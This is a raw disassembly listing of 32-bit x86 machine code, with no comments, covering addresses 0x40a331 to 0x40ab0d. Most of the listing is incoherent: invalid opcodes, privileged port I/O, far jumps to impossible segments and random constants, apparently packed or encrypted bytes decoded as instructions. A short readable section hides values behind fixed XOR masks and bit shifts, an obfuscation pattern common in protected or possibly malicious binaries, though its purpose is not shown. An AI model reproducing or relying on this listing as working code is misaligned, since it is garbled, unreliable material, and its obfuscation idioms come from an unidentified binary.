  40a331:	shl    BYTE PTR [eax],1
  40a333:	scas   al,BYTE PTR es:[edi]
  40a334:	inc    edi
  40a335:	mov    ecx,0x71921bef
  40a33a:	mov    ebx,esp
  40a33c:	lahf   
  40a33d:	scas   eax,DWORD PTR es:[edi]
  40a33e:	push   esp
  40a33f:	fst    QWORD PTR ds:0x2b9c5b56
  40a345:	fld    TBYTE PTR [edx-0x11]
  40a348:	or     al,0x14
  40a34a:	xchg   ecx,eax
  40a34b:	fs in  al,dx
  40a34d:	pusha  
  40a34e:	add    DWORD PTR [ebx],esp
  40a350:	(bad)  
  40a351:	into   
  40a352:	repnz or cl,bh
  40a355:	test   eax,0x5828196b
  40a35a:	dec    ebx
  40a35b:	je     0x40a345
  40a35d:	push   eax
  40a35e:	pop    ds
  40a35f:	pop    edx
  40a360:	fisttp DWORD PTR [edi]
  40a362:	cmp    BYTE PTR [eax+0x4d942a8d],ah
  40a368:	lods   al,BYTE PTR ds:[esi]
  40a369:	push   edi
  40a36a:	xchg   esi,eax
  40a36b:	xchg   ebp,eax
  40a36c:	fs push ebx
  40a36e:	hlt    
  40a36f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a370:	jne    0x40a381
  40a372:	(bad)  
  40a374:	dec    esi
  40a375:	retf   
  40a376:	dec    ecx
  40a377:	fcomp  DWORD PTR [edx]
  40a379:	repz inc edi
  40a37b:	rcl    BYTE PTR [eax],cl
  40a37d:	outs   dx,BYTE PTR ds:[esi]
  40a37e:	jo     0x40a3d4
  40a380:	sub    DWORD PTR [ebp-0x4a31c982],esp
  40a386:	std    
  40a387:	outs   dx,DWORD PTR ds:[esi]
  40a388:	pop    ebx
  40a389:	fdiv   st(6),st
  40a38b:	arpl   WORD PTR [edi],ax
  40a38d:	xor    al,BYTE PTR [edx+0x293ca614]
  40a393:	sti    
  40a394:	inc    eax
  40a395:	aad    0x30
  40a397:	aam    0xc4
  40a399:	xor    eax,0xcbbdceb1
  40a39e:	pop    esp
  40a39f:	jle    0x40a38e
  40a3a1:	pop    ecx
  40a3a2:	(bad)  
  40a3a3:	xchg   edx,eax
  40a3a4:	not    ecx
  40a3a6:	cmovo  ebx,edx
  40a3a9:	sahf   
  40a3aa:	scas   eax,DWORD PTR es:[edi]
  40a3ab:	mov    cl,0x35
  40a3ad:	inc    esp
  40a3ae:	ins    BYTE PTR es:[edi],dx
  40a3af:	enter  0x1c70,0xdf
  40a3b3:	es imul ebx,esi,0xf2f2ad91
  40a3ba:	add    DWORD PTR [edx+edi*4+0x22],edx
  40a3be:	xor    BYTE PTR [edx-0x2d075a84],dl
  40a3c4:	push   edi
  40a3c5:	inc    esi
  40a3c6:	xchg   ebx,eax
  40a3c7:	pop    esi
  40a3c8:	and    edx,DWORD PTR [ebp+ecx*1+0x1e2b8c8e]
  40a3cf:	imul   ebp,DWORD PTR [edi+0x4c25233c],0xffffffc9
  40a3d6:	call   0x4eae:0xc7ec43a
  40a3dd:	dec    edx
  40a3de:	or     bl,BYTE PTR [edx+0x28]
  40a3e1:	gs jo  0x40a3c5
  40a3e4:	fs dec esi
  40a3e6:	aas    
  40a3e7:	inc    edi
  40a3e8:	sub    BYTE PTR [ecx+0x7a504a8b],dl
  40a3ee:	add    BYTE PTR [eax+0x349ed651],ch
  40a3f4:	jnp    0x40a41b
  40a3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3f7:	lea    esp,[esi-0x22]
  40a3fa:	test   al,0x39
  40a3fc:	out    0xc9,al
  40a3fe:	test   eax,0xb7240d7d
  40a403:	inc    edi
  40a404:	ret    
  40a405:	pop    edi
  40a406:	into   
  40a407:	inc    ebx
  40a408:	dec    edi
  40a409:	arpl   WORD PTR [eax-0x20],ax
  40a40c:	xchg   esp,eax
  40a40d:	cmp    dh,BYTE PTR [ebp+ebx*1+0x4e15f8a0]
  40a414:	retf   0x3d2b
  40a417:	div    BYTE PTR [eax-0x58]
  40a41a:	fnsave [ebx+ebp*2+0x5b]
  40a41e:	fs int3 
  40a420:	cmp    ebx,ecx
  40a422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a423:	sub    ebp,edx
  40a425:	std    
  40a426:	sub    dl,dh
  40a428:	fbstp  TBYTE PTR [eax+0x2bbafeb5]
  40a42e:	mov    dl,0x88
  40a430:	inc    ebx
  40a431:	pusha  
  40a432:	call   0x897c:0xf5821c75
  40a439:	les    edi,FWORD PTR [eax]
  40a43b:	out    dx,al
  40a43c:	xchg   ebp,eax
  40a43d:	push   esp
  40a43e:	enter  0x998f,0x13
  40a442:	(bad)  
  40a443:	mov    ds:0xb6efc635,al
  40a448:	mov    esi,0x505ac04
  40a44d:	dec    ebp
  40a44e:	(bad)  
  40a44f:	fdivrp st(7),st
  40a451:	mov    eax,0xdd820d6d
  40a456:	fldcw  WORD PTR [eax+0x2e]
  40a459:	mov    edi,DWORD PTR [edi]
  40a45b:	fcmovb st,st(4)
  40a45d:	pop    ss
  40a45e:	and    ebx,DWORD PTR [ebx-0x125d70c3]
  40a464:	mov    al,ds:0x327784d0
  40a469:	push   es
  40a46a:	ins    DWORD PTR es:[edi],dx
  40a46b:	enter  0x69e6,0xc4
  40a46f:	jg     0x40a4b7
  40a471:	cmp    al,BYTE PTR [ebx+0x46]
  40a474:	fadd   st(2),st
  40a476:	jae    0x40a4dd
  40a478:	ins    DWORD PTR es:[edi],dx
  40a479:	sub    al,0x15
  40a47b:	push   0x0
  40a47d:	jne    0x40a41c
  40a47f:	xchg   ecx,eax
  40a480:	daa    
  40a481:	push   edx
  40a482:	mov    esp,0x74c0e490
  40a487:	adc    ecx,DWORD PTR ds:[eax-0x12384eb2]
  40a48e:	push   ss
  40a48f:	ficomp WORD PTR [esi-0x66]
  40a492:	pop    ebx
  40a493:	push   ss
  40a494:	xor    al,BYTE PTR [ebp+0x60950aa4]
  40a49a:	mov    al,ds:0x55ef4da7
  40a49f:	inc    eax
  40a4a0:	and    ecx,DWORD PTR [edi-0x391c8716]
  40a4a6:	xchg   esp,eax
  40a4a7:	clc    
  40a4a8:	and    ecx,DWORD PTR [esi-0x35318292]
  40a4ae:	add    ecx,DWORD PTR [esi-0x7b96455c]
  40a4b4:	xchg   esi,eax
  40a4b5:	dec    ebp
  40a4b6:	jge    0x40a4d5
  40a4b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4b9:	inc    eax
  40a4ba:	sahf   
  40a4bb:	add    edx,DWORD PTR [edi]
  40a4bd:	enter  0x583b,0x8d
  40a4c1:	adc    DWORD PTR [esi-0x1d610d34],ecx
  40a4c7:	pop    esp
  40a4c8:	pop    ebx
  40a4c9:	cli    
  40a4ca:	mov    cl,bl
  40a4cc:	jne    0x40a45c
  40a4ce:	(bad)  
  40a4cf:	cwde   
  40a4d0:	es loope 0x40a481
  40a4d3:	bsf    esi,DWORD PTR [edx+eax*1]
  40a4d7:	test   eax,0xb3dfa7a8
  40a4dc:	int    0xf9
  40a4de:	xchg   ecx,eax
  40a4df:	mov    fs,WORD PTR [eax-0x527d149b]
  40a4e5:	pop    edi
  40a4e6:	cs inc esp
  40a4e8:	mov    ecx,0xe01f9fe0
  40a4ed:	retf   
  40a4ee:	icebp  
  40a4ef:	out    0x2,eax
  40a4f1:	or     BYTE PTR [ebx+0x0],0x22
  40a4f5:	call   0x416c20
  40a4fa:	mov    eax,DWORD PTR [esi]
  40a4fc:	mov    ecx,DWORD PTR [esi+0x4]
  40a4ff:	shrd   eax,ecx,0x2
  40a503:	shr    ecx,0x2
  40a506:	shr    edx,0x1e
  40a509:	xor    ecx,0xe706e27a
  40a50f:	push   ecx
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a4c6
  40a524:	pop    esi
  40a525:	mov    eax,ds:0x182bd870
  40a52a:	sbb    BYTE PTR [esi-0x68e7e7ee],bl
  40a530:	dec    eax
  40a531:	xor    BYTE PTR cs:[esi+0xf4e9ea9],al
  40a538:	and    ecx,DWORD PTR [ebx+eax*8+0x1b43e90e]
  40a53f:	inc    ebp
  40a540:	mov    ds:0xd4f16038,eax
  40a545:	ret    
  40a546:	xchg   ecx,eax
  40a547:	sbb    edx,DWORD PTR [edi]
  40a549:	in     al,dx
  40a54a:	mov    eax,0x5a53b06f
  40a54f:	data16 mov cl,0x67
  40a552:	sbb    ebx,ebx
  40a554:	mov    al,0x35
  40a556:	lahf   
  40a557:	pop    DWORD PTR es:[ebp+0x3c4a687a]
  40a55e:	dec    ebp
  40a55f:	push   eax
  40a560:	mov    dh,0xe9
  40a562:	xor    al,0x80
  40a564:	xchg   ebp,eax
  40a565:	mov    bh,0x6a
  40a567:	mov    ecx,0xc012507
  40a56c:	mov    esp,0x18df7099
  40a571:	mov    ds:0x2d185786,eax
  40a576:	fbld   TBYTE PTR ds:0xaa55a951
  40a57c:	adc    BYTE PTR [edx],0x23
  40a57f:	ror    bh,cl
  40a581:	jge    0x40a5d3
  40a583:	out    dx,eax
  40a584:	imul   ebp,DWORD PTR [ecx+0x2e269d06],0x1e
  40a58b:	in     al,0x6b
  40a58d:	out    dx,al
  40a58e:	push   ecx
  40a58f:	bound  esi,QWORD PTR [eax-0x3b]
  40a592:	sbb    BYTE PTR [edx+0x7cc5a2b5],0x8a
  40a599:	out    dx,al
  40a59a:	fdivp  st(3),st
  40a59c:	aad    0xa
  40a59e:	nop
  40a59f:	imul   esp,DWORD PTR [ecx+0x76],0xffffffc0
  40a5a3:	jl     0x40a59b
  40a5a5:	nop
  40a5a6:	xor    ebx,DWORD PTR gs:[ebx+ecx*1]
  40a5aa:	xor    eax,DWORD PTR ds:0x93c9cb2d
  40a5b0:	es int3 
  40a5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5b3:	repz pushf 
  40a5b5:	adc    DWORD PTR ds:0x1e42094d,esp
  40a5bb:	retf   
  40a5bc:	test   eax,0xf9503830
  40a5c1:	(bad)  
  40a5c2:	ds cmp al,0x9d
  40a5c5:	inc    ebx
  40a5c6:	jmp    0x140bc25d
  40a5cb:	xchg   ecx,eax
  40a5cc:	daa    
  40a5cd:	jp     0x40a633
  40a5cf:	div    DWORD PTR [ecx+0x26]
  40a5d2:	pop    edx
  40a5d3:	jecxz  0x40a59a
  40a5d5:	sti    
  40a5d6:	cmp    al,0x36
  40a5d8:	inc    ecx
  40a5d9:	adc    ch,cl
  40a5db:	cmc    
  40a5dc:	sub    eax,0x86387cf6
  40a5e1:	jae    0x40a622
  40a5e3:	jne    0x40a617
  40a5e5:	je     0x40a648
  40a5e7:	sub    esp,DWORD PTR [esi+esi*2+0x75]
  40a5eb:	je     0x40a5a5
  40a5ed:	loop   0x40a620
  40a5ef:	jns    0x40a5f3
  40a5f1:	fcomp  st(2)
  40a5f3:	push   ebx
  40a5f4:	jmp    0x4c49:0x16db35d2
  40a5fb:	jns    0x40a5cd
  40a5fd:	inc    esp
  40a5fe:	pop    ds
  40a5ff:	push   ss
  40a600:	add    eax,0x3a0468b5
  40a605:	out    dx,eax
  40a606:	retf   0x7d1b
  40a609:	mov    ah,0x67
  40a60b:	pusha  
  40a60c:	in     eax,0xb3
  40a60e:	adc    BYTE PTR [edi],ah
  40a610:	scas   al,BYTE PTR es:[edi]
  40a611:	dec    ecx
  40a612:	dec    ebp
  40a613:	inc    edi
  40a614:	sbb    eax,0xfbf6308b
  40a619:	add    eax,0x4d837267
  40a61e:	not    DWORD PTR [esi-0x15]
  40a621:	xor    al,0xa1
  40a623:	sar    DWORD PTR [edi],cl
  40a625:	test   eax,0xd2e872b9
  40a62a:	mov    ah,0xbe
  40a62c:	aam    0x22
  40a62e:	into   
  40a62f:	push   ebp
  40a630:	mov    eax,ds:0xe706a152
  40a635:	jle    0x40a5fd
  40a637:	mov    BYTE PTR [ecx],cl
  40a639:	adc    edi,DWORD PTR [ecx]
  40a63b:	js     0x40a6b5
  40a63d:	jo     0x40a670
  40a63f:	lock fs cmp ebx,edi
  40a643:	popa   
  40a644:	into   
  40a645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a646:	xor    al,0x1
  40a648:	bound  eax,QWORD PTR [edi+eax*8-0x5153fe3c]
  40a64f:	sar    BYTE PTR [eax-0x57618aea],cl
  40a655:	and    DWORD PTR [ebx+0x70],ecx
  40a658:	pop    esi
  40a659:	push   ebx
  40a65a:	dec    ecx
  40a65b:	pushf  
  40a65c:	das    
  40a65d:	in     al,dx
  40a65e:	mov    esi,ss
  40a660:	leave  
  40a661:	nop
  40a662:	adc    eax,0xfffffff1
  40a665:	sbb    bp,WORD PTR cs:[ebx]
  40a669:	dec    edi
  40a66a:	mov    WORD PTR [ebp-0x3e],ds
  40a66d:	out    0x0,al
  40a66f:	addr16 adc al,0x56
  40a672:	mov    dl,al
  40a674:	dec    eax
  40a675:	in     al,dx
  40a676:	mov    es,eax
  40a678:	sti    
  40a679:	js     0x40a6c3
  40a67b:	in     al,0x7c
  40a67d:	jle    0x40a6be
  40a67f:	in     al,dx
  40a680:	pop    esp
  40a681:	rcl    DWORD PTR [edx+eax*2],0x8e
  40a685:	lds    ebp,FWORD PTR fs:[edi+0x27d55cb4]
  40a68c:	or     al,0xdd
  40a68e:	loope  0x40a6a9
  40a690:	mov    eax,ds:0xfdadd8b7
  40a695:	pushf  
  40a696:	inc    esi
  40a697:	add    eax,0xf5a95130
  40a69c:	es or  eax,0x85ad21a5
  40a6a2:	fisttp WORD PTR [ebx+0x2c68367d]
  40a6a8:	push   ds
  40a6a9:	nop
  40a6aa:	fsub   QWORD PTR [edi+0x7c79c777]
  40a6b0:	shl    ah,cl
  40a6b2:	cmp    ch,bl
  40a6b4:	push   0x8355c14e
  40a6b9:	cwde   
  40a6ba:	(bad)  
  40a6bb:	xchg   edx,eax
  40a6bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6bd:	push   edx
  40a6be:	pushf  
  40a6bf:	or     BYTE PTR [esi+eax*2+0x62],bl
  40a6c3:	inc    ebp
  40a6c4:	sbb    ecx,0x88961723
  40a6ca:	xor    bl,bh
  40a6cc:	jmp    0xd390:0xeeee5ce8
  40a6d3:	stc    
  40a6d4:	pop    ebp
  40a6d5:	jno    0x40a6fe
  40a6d7:	ins    DWORD PTR es:[edi],dx
  40a6d8:	mov    ebx,0xc496092a
  40a6dd:	xor    BYTE PTR [edi-0x398c80f7],bh
  40a6e3:	cmp    al,0xf2
  40a6e5:	loope  0x40a684
  40a6e7:	mov    edi,DWORD PTR [eax+0x1a67903]
  40a6ed:	fscale 
  40a6ef:	(bad)  [ecx-0x1e]
  40a6f2:	pusha  
  40a6f3:	test   al,0x15
  40a6f5:	add    eax,0xe6be763b
  40a6fa:	rol    ebp,cl
  40a6fc:	xor    DWORD PTR [edi+0x3f1fea36],ebp
  40a702:	mov    edx,0x8bd6704b
  40a707:	xchg   al,bh
  40a709:	mov    eax,ds:0x1390a7f1
  40a70e:	or     eax,0xb4ba7317
  40a713:	push   ds
  40a714:	into   
  40a715:	pop    ebp
  40a716:	stos   BYTE PTR es:[edi],al
  40a717:	cdq    
  40a718:	and    ah,ah
  40a71a:	sub    al,0x39
  40a71c:	add    eax,0x73c7e799
  40a721:	mov    esi,0x7e2df55
  40a726:	push   ss
  40a727:	imul   ebp,DWORD PTR [edi+0x6a],0xffffff91
  40a72b:	test   bl,dl
  40a72d:	sub    bh,BYTE PTR [ebx+0x26]
  40a730:	ficom  WORD PTR [ebx+ebx*8]
  40a733:	ins    DWORD PTR es:[edi],dx
  40a734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a735:	out    0x51,al
  40a737:	or     BYTE PTR [ebp-0x78],dl
  40a73a:	bound  esp,QWORD PTR [eax+0x5526572e]
  40a740:	out    dx,eax
  40a741:	inc    ecx
  40a742:	and    bh,BYTE PTR [edx]
  40a744:	inc    edx
  40a745:	cmp    esi,eax
  40a747:	sahf   
  40a748:	loop   0x40a733
  40a74a:	imul   ebx,DWORD PTR ds:0x7461ac0d,0xffffffa6
  40a751:	add    al,0xe
  40a753:	dec    esp
  40a754:	adc    ecx,DWORD PTR [ebp+0x71]
  40a757:	xor    eax,0xd5946ed7
  40a75c:	jmp    0xa961:0x56206a7e
  40a763:	pop    ecx
  40a764:	push   esp
  40a765:	sub    cl,0x7c
  40a768:	rol    DWORD PTR gs:[eax],1
  40a76b:	cmp    esp,DWORD PTR [ebx-0x5d08aa77]
  40a771:	enter  0xf421,0x6c
  40a775:	out    dx,eax
  40a776:	gs push ds
  40a778:	sar    BYTE PTR [ecx-0x202d2f2d],1
  40a77e:	(bad)  
  40a77f:	fndisi(8087 only) 
  40a781:	add    esp,esi
  40a783:	popa   
  40a784:	and    DWORD PTR [eax],esp
  40a786:	jp     0x40a7e4
  40a788:	jg     0x40a79c
  40a78a:	out    dx,eax
  40a78b:	loop   0x40a80c
  40a78d:	faddp  st(5),st
  40a78f:	pop    edi
  40a790:	(bad)  [ecx-0x45]
  40a793:	mov    edi,0x1ef6a631
  40a798:	xor    ebp,DWORD PTR [esi+0x18f1e9a]
  40a79e:	push   cs
  40a79f:	push   0xffffff81
  40a7a1:	fs jmp 0xd5bd2d0e
  40a7a7:	jns    0x40a7c9
  40a7a9:	lahf   
  40a7aa:	jnp    0x40a7f4
  40a7ac:	loope  0x40a789
  40a7ae:	mov    eax,0xae92826e
  40a7b3:	popf   
  40a7b4:	sub    ebp,DWORD PTR [esi+0x291d9dc0]
  40a7ba:	shl    DWORD PTR [esi],0x11
  40a7bd:	clc    
  40a7be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7bf:	das    
  40a7c0:	in     al,0x50
  40a7c2:	call   0x829a:0xe003a90a
  40a7c9:	push   ss
  40a7ca:	pop    ebx
  40a7cb:	push   ebp
  40a7cc:	out    0x1a,eax
  40a7ce:	sub    DWORD PTR [ebx+ebx*8+0x6d383636],0xeef43032
  40a7d9:	daa    
  40a7da:	rol    esi,1
  40a7dc:	mov    al,0x14
  40a7de:	jae    0x40a83a
  40a7e0:	ins    BYTE PTR es:[edi],dx
  40a7e1:	out    dx,al
  40a7e2:	mov    bh,0xa5
  40a7e4:	sbb    DWORD PTR [esi+eax*4-0x5a91736b],edx
  40a7eb:	fdiv   DWORD PTR [eax+0x4c]
  40a7ee:	in     eax,0xc6
  40a7f0:	or     esi,0xffffffac
  40a7f3:	xchg   esi,eax
  40a7f4:	popf   
  40a7f5:	test   al,0x7f
  40a7f7:	push   esi
  40a7f8:	mov    ds:0x85328482,eax
  40a7fd:	dec    eax
  40a7fe:	aaa    
  40a7ff:	rcl    DWORD PTR [eax-0x19],cl
  40a802:	xor    al,0xf3
  40a804:	jne    0x40a7a7
  40a806:	mov    esp,0x49433e36
  40a80b:	sbb    BYTE PTR [edx+0x5c32e6fd],bl
  40a811:	ret    0x77c5
  40a814:	push   ebx
  40a815:	adc    DWORD PTR ds:0x704675b0,0x7e
  40a81c:	jns    0x40a83c
  40a81e:	xchg   esp,eax
  40a81f:	cmp    al,0xe7
  40a821:	cmp    al,0x1c
  40a823:	imul   esi,DWORD PTR [ebp+0x726936b6],0x2f78740c
  40a82d:	cld    
  40a82e:	xchg   DWORD PTR [edx-0x5d],edx
  40a831:	aad    0xe1
  40a833:	cmp    al,0xf3
  40a835:	push   eax
  40a836:	iret   
  40a837:	dec    edx
  40a838:	xchg   ebp,eax
  40a839:	dec    esi
  40a83a:	ror    dh,1
  40a83c:	xor    DWORD PTR [edi-0x78],esp
  40a83f:	(bad)  
  40a840:	icebp  
  40a841:	xchg   ecx,eax
  40a842:	add    al,0x91
  40a844:	fadd   st(2),st
  40a846:	inc    ecx
  40a847:	xchg   esi,eax
  40a848:	xchg   esi,eax
  40a849:	sub    al,0x58
  40a84b:	add    DWORD PTR [ecx-0x344cb72],edx
  40a851:	push   ecx
  40a852:	inc    esp
  40a853:	call   0xc7ef:0xd553e7b0
  40a85a:	xchg   edx,ecx
  40a85c:	daa    
  40a85d:	xchg   esp,eax
  40a85e:	addr16 mov ecx,0xa9ebfa41
  40a864:	lahf   
  40a865:	pop    edx
  40a866:	nop
  40a867:	ret    0x39e
  40a86a:	test   edx,eax
  40a86c:	pop    ss
  40a86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a86e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a86f:	mov    dl,dh
  40a871:	cmp    ebp,DWORD PTR [esi+0x5424758]
  40a877:	xor    eax,edi
  40a879:	mov    eax,DWORD PTR [eax]
  40a87b:	fistp  WORD PTR [edx]
  40a87d:	or     ebp,esi
  40a87f:	jo     0x40a8af
  40a881:	imul   ecx,DWORD PTR [edx+ebx*1+0x11b06076],0x1c716a8b
  40a88c:	add    eax,0x1f803b57
  40a891:	and    ah,BYTE PTR [esi]
  40a893:	sbb    esp,esp
  40a895:	cmp    BYTE PTR [edi+0x43],0xe1
  40a899:	outs   dx,BYTE PTR ds:[esi]
  40a89a:	ss jns 0x40a8bc
  40a89d:	add    edx,edx
  40a89f:	sub    cl,dl
  40a8a1:	mov    bh,0x1b
  40a8a3:	mov    cl,0x4a
  40a8a5:	inc    edi
  40a8a6:	sar    DWORD PTR [esi+0x19],0x4c
  40a8aa:	stos   BYTE PTR es:[edi],al
  40a8ab:	add    al,0x70
  40a8ad:	loope  0x40a8b5
  40a8af:	fistp  QWORD PTR [ebp+0x225ac74]
  40a8b5:	psubusw mm5,mm6
  40a8b8:	cmp    esi,DWORD PTR [ebx-0x3]
  40a8bb:	daa    
  40a8bc:	cmc    
  40a8bd:	scas   al,BYTE PTR es:[edi]
  40a8be:	and    al,0xcb
  40a8c0:	or     ecx,DWORD PTR [edx+0x56f39c3e]
  40a8c6:	rcr    BYTE PTR [edx-0x18],1
  40a8c9:	mov    edi,0x23b23151
  40a8ce:	out    dx,al
  40a8cf:	sbb    ebx,esi
  40a8d1:	xchg   cl,bl
  40a8d3:	xlat   BYTE PTR ds:[ebx]
  40a8d4:	jns    0x40a900
  40a8d6:	or     bh,BYTE PTR [ebx+0x61]
  40a8d9:	shr    DWORD PTR [eax],1
  40a8db:	sti    
  40a8dc:	(bad)  
  40a8dd:	jbe    0x40a881
  40a8df:	inc    edi
  40a8e0:	xor    BYTE PTR [ebp+0x57],ch
  40a8e3:	ins    DWORD PTR es:[edi],dx
  40a8e4:	out    0x4,eax
  40a8e6:	es icebp 
  40a8e8:	add    eax,0x6d8d5814
  40a8ed:	outs   dx,BYTE PTR ds:[esi]
  40a8ee:	sub    bl,BYTE PTR [edi-0x77]
  40a8f1:	push   ebp
  40a8f2:	adc    BYTE PTR [ebx+0x47b8b13],cl
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x428303,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282f7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428253,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282fb,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428283
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428277,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282f3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42822b
  40aa46:	sbb    DWORD PTR ds:0x42816b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0xca7e1f6a
  40aa65:	into   
  40aa66:	and    eax,0x18235faa
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	mov    ecx,0x46274008
  40aa75:	sahf   
  40aa76:	mov    esp,0x89a4721b
  40aa7b:	dec    eax
  40aa7c:	adc    bl,cl
  40aa7e:	aas    
  40aa7f:	hlt    
  40aa80:	in     al,dx
  40aa81:	jne    0x40aa1b
  40aa83:	sbb    al,0x67
  40aa85:	rol    BYTE PTR [ecx+0x29ae753d],1
  40aa8b:	std    
  40aa8c:	popf   
  40aa8d:	dec    edi
  40aa8e:	pop    ebp
  40aa8f:	das    
  40aa90:	enter  0x3b78,0xc3
  40aa94:	jmp    0x40aa2a
  40aa96:	std    
  40aa97:	xor    DWORD PTR [esi],esi
  40aa99:	push   eax
  40aa9a:	cdq    
  40aa9b:	add    eax,0xec8ee26f
  40aaa0:	popf   
  40aaa1:	mov    dh,0x51
  40aaa3:	xor    DWORD PTR [eax+0x24],esi
  40aaa6:	fs cs ror ecx,1
  40aaaa:	sub    bl,BYTE PTR [edi+edx*2+0x5b]
  40aaae:	mov    dh,BYTE PTR [eax-0x14]
  40aab1:	cli    
  40aab2:	adc    al,BYTE PTR [ebp-0x33c296]
  40aab8:	mov    bh,0x81
  40aaba:	and    cl,bl
  40aabc:	jge    0x40aa86
  40aabe:	xor    ch,BYTE PTR es:[ebx-0x32ab090e]
  40aac5:	call   0x94ebb563
  40aaca:	mov    ch,0xca
  40aacc:	add    ecx,esi
  40aace:	sub    dh,BYTE PTR [esi-0x5fb84349]
  40aad4:	lds    esp,FWORD PTR [eax-0x640b5cae]
  40aada:	fs pushf 
  40aadc:	cli    
  40aadd:	xchg   ecx,eax
  40aade:	(bad)  
  40aae0:	pop    es
  40aae1:	push   0xe9880dbc
  40aae6:	ds cmp bl,al
  40aae9:	repz lds ecx,FWORD PTR [edi-0x5a]
  40aaed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaee:	aam    0x85
  40aaf0:	push   0x4c
  40aaf2:	jnp    0x40ab26
  40aaf4:	int    0xb
  40aaf6:	test   eax,0x176550d
  40aafb:	shl    BYTE PTR [ecx],cl
  40aafd:	pop    esp
  40aafe:	jge    0x40ab3b
  40ab00:	cmp    DWORD PTR [esi-0x3529a19f],edi
  40ab06:	add    BYTE PTR [ebp-0x5eb25caa],bl
  40ab0c:	outs   dx,BYTE PTR ds:[esi]
  40ab0d:	pop    ebp
